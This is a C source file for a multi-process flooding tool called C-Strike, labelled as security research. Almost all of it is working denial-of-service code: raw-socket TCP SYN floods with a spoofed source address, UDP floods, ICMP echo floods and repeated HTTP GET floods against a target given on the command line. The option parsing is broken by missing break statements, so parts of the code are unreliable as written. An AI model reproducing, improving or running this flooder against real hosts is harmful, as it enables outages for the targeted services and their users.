//C-Strike: a security research for flooding
//Copyright (C) 2025  Jan Kałucki
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netdb.h>
#include "C-Strike.h"

int opts;
extern int optind;
extern char* optarg;
unsigned int n_proc=4;
unsigned int duration=10;
unsigned int pkt_len =1000;
unsigned short port = 80;
char* target = "127.0.0.1";
char* type ="UDP flooding";

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    unsigned short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return answer;
}

unsigned char* rand_bytes(unsigned int size){
	srand(time(NULL));
	unsigned char* stream = malloc(size);
	for(unsigned int i = 0; i < size; i++){
		stream[i]=rand();
	}
	return stream;
}

void parse_url(const char *url, char *host, char *path) {
    if (strncmp(url, "http://", 7) == 0) {
        url += 7;
    }

    const char *path_start = strchr(url, '/');
    if (path_start) {
        strncpy(host, url, path_start - url);
        host[path_start - url] = '\0';
        strcpy(path, path_start);
    } else {
        strcpy(host, url);
        strcpy(path, "/");
    }
}

unsigned short random_ushort() {
	srand(time(NULL));
	return (unsigned short)((rand() << 8) | (rand() & 0xFF));
}

int SYN_flood(char* target,unsigned short port, unsigned int msg_len, time_t duration){
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket error");
        return 1;
    }
    time_t end = time(NULL) + duration;
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char datagram[4096];
    memset(datagram, 0, 4096);

    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    struct sockaddr_in dest;

    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = inet_addr(target);

    // Fill in IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.2");
    iph->daddr = dest.sin_addr.s_addr;

    iph->check = checksum((unsigned short *) datagram, iph->tot_len);

    // Fill in TCP Header
    tcph->source = htons(random_ushort());
    tcph->dest = htons(80);
    tcph->seq = random();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // Pseudo header for checksum
    struct pseudo_header psh;
    psh.source_address = inet_addr("192.168.1.2");
    psh.dest_address = dest.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
    memcpy(pseudo_packet, &psh, sizeof(struct pseudo_header));
    memcpy(pseudo_packet + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

    tcph->check = checksum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));
    while(time(NULL)<end){
       if (sendto(sock, datagram, iph->tot_len, 0,
               (struct sockaddr *)&dest, sizeof(dest)) < 0) {
	perror("Send failed");
	return 2;
       } else {
           printf("SYN packet sent\n");
       }
   }
    close(sock);
    return 0;
}
int UDP_flood(char *target,unsigned short port, unsigned int msg_len, time_t duration){
	int sock = socket(AF_INET,SOCK_DGRAM , 0);
	if(sock < 0){
		perror("Failed to create socket.");
		return 1;
	}
	time_t end = time(NULL)+duration;
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(target);
	server.sin_port = htons(port);
	unsigned char* buf = rand_bytes(msg_len);
	while (time(NULL)<end) {
		if(sendto(sock, buf, msg_len, 0, (struct sockaddr*)&server, sizeof(server))<0){
			perror("Send failed");
			return 2;
		}
	}
	close(sock);

	return 0;
}
int ICMP_flood(char *target, unsigned short port, unsigned int msg_len, time_t duration){
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("Socket error");
        return 1;
    }
    time_t end = time(NULL) + duration;
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char datagram[4096];
    memset(datagram, 0, 4096);

    struct iphdr *iph = (struct iphdr *) datagram;
    struct icmp_header *icmph = (struct icmp_header *) (datagram + sizeof(struct iphdr));
    struct sockaddr_in dest;

    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = inet_addr(target);

    // Fill in IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_ICMP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.2");
    iph->daddr = dest.sin_addr.s_addr;

    iph->check = checksum((unsigned short *) datagram, iph->tot_len);

    // Fill in TCP Header
    icmph->type = 8;
    icmph->code = 0;
    icmph->checksum = 0;
    u_int16_t check = checksum((unsigned short *)icmph, sizeof(struct icmp_header));
    icmph->checksum = check;
    while(time(NULL)<end){
       if (sendto(sock, datagram, iph->tot_len, 0,
               (struct sockaddr *)&dest, sizeof(dest)) < 0) {
	perror("Send failed");
	return 2;
       } else {
           printf("ICMP echo request packet sent\n");
       }
   }
    close(sock);
    return 0;
}
int HTTP_flood(char *target, unsigned short port, unsigned int msg_len, time_t duration){
    char host[256];
    char path[1024];
    parse_url(target, host, path);

    struct hostent *server = gethostbyname(host);
    if (!server) {
        fprintf(stderr, "Failed to resolve host: %s\n", host);
        return 1;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 2;
    }

    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(80);
    serv_addr.sin_addr = *((struct in_addr *)server->h_addr);
    memset(&(serv_addr.sin_zero), 0, 8);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return 3;
    }

    char request[2048];
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n"
             "\r\n",
             path, host);
    time_t end = time(NULL) + duration;
    while(time(NULL)<end){
    send(sock, request, strlen(request), 0);
    }
    close(sock);
    return 0;
}
void run_processes(int n, int (*func)(char*, unsigned short, unsigned int, time_t), char *target, unsigned short port, unsigned int msg_len, time_t duration) {
    for (int i = 0; i < n; i++) {
        pid_t pid = fork();
        if (pid < 0) {
            perror("fork failed");
            exit(EXIT_FAILURE);
        } else if (pid == 0) {
            func(target,port,msg_len,duration);
            exit(EXIT_SUCCESS);
        }
    }
    for (int i = 0; i < n; i++) {
        wait(NULL);
    }
}

int main(int argc, char** argv){
	//Target;type;n_proc;duration;packet_len
	while((opts = getopt(argc,argv,"T:t:p:n:d:l:"))!= EOF){
		switch(opts){
			case 'T':
				target = optarg;
			break;
			case 't':
				type = optarg;
			break;
			case 'p':
				port = (unsigned short)atoi(optarg);

			case 'n':
				n_proc = (unsigned int)(atoi(optarg));
			break;
			case 'd':
				duration = (unsigned int)(atoi(optarg));
			case 'l':
				pkt_len = (unsigned int)(atoi(optarg));
			case '?':
				fprintf(stderr,
				"Usage: C-Strike [-T target] [-t type] [-n n_processes] [-d duration] [-l packet length]");
				return 1;
			break;
		
		}
	}
	printf("target:%s,type:%s,n_proc:%d,duration:%d,pkt_len:%d",
		target, type, n_proc, duration, pkt_len);
	if(!strcmp(type, "TCP_SYN")){
		run_processes(n_proc, SYN_flood, target, port, pkt_len, duration);
	}
	else if (!strcmp(type, "UDP")) {
		run_processes(n_proc, UDP_flood, target, port, pkt_len, duration);
	}
	else if (!strcmp(type,"ICMP")) {
		run_processes(n_proc, ICMP_flood, target, port, pkt_len, duration);
	}
	else if (!strcmp(type,"HTTP")) {
		run_processes(n_proc, HTTP_flood, target, port, pkt_len, duration);
	}

	return 0;
}
